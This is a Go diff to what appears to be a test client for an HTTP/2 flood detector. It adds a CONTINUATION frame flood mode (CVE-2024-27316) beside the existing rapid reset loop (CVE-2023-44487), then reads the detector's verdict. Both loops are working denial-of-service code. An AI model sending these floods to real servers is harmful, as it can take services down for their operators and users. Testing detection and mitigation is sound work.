@@ -105,15 +105,35 @@ func main() {
 		return
 	}
 
-	// 2. The flood: each stream opened with HEADERS then immediately cancelled with RST_STREAM.
-	reset := 0
-	for i := 0; i < floods; i++ {
-		s := uint32(3 + 2*i)
-		writeReq(s, sid)
-		if err := fr.WriteRSTStream(s, http2.ErrCodeCancel); err != nil {
-			break // server may have closed the connection (its own rapid-reset mitigation)
+	// 2. The flood. KS_MODE=continuation runs the CVE-2024-27316 shape (one open HEADERS followed by a
+	// stream of empty CONTINUATION frames); the default is the CVE-2023-44487 rapid reset.
+	sent := 0
+	if env("KS_MODE", "rapidreset") == "continuation" {
+		// HEADERS on stream 3 without END_HEADERS, then empty CONTINUATION frames; the last sets
+		// END_HEADERS so the (otherwise valid, empty-continued) request completes and a handler runs.
+		hb.Reset()
+		_ = enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+		_ = enc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
+		_ = enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
+		_ = enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Hostname()})
+		_ = enc.WriteField(hpack.HeaderField{Name: "cookie", Value: "ks_sid=" + sid})
+		_ = fr.WriteHeaders(http2.HeadersFrameParam{StreamID: 3, BlockFragment: hb.Bytes(), EndStream: true})
+		for i := 0; i < floods; i++ {
+			last := i == floods-1
+			if err := fr.WriteContinuation(3, last, nil); err != nil {
+				break // server's CONTINUATION-flood mitigation may have closed the connection
+			}
+			sent++
 		}
-		reset++
+	} else {
+		for i := 0; i < floods; i++ {
+			s := uint32(3 + 2*i)
+			writeReq(s, sid)
+			if err := fr.WriteRSTStream(s, http2.ErrCodeCancel); err != nil {
+				break // server may have closed the connection (its own rapid-reset mitigation)
+			}
+			sent++
+		}
 	}
 
 	// 3. A final completing request on the same session, so a handler runs and sees the flood counts.
@@ -126,7 +146,7 @@ func main() {
 	}
 
 	// 4. Read the detector's verdict for the session.
-	verdict := map[string]any{"resets_sent": reset}
+	verdict := map[string]any{"flood_frames_sent": sent, "mode": env("KS_MODE", "rapidreset")}
 	if resp, err := readVerdict(detector, sid); err == nil {
 		verdict["verdict"] = resp
 	} else {
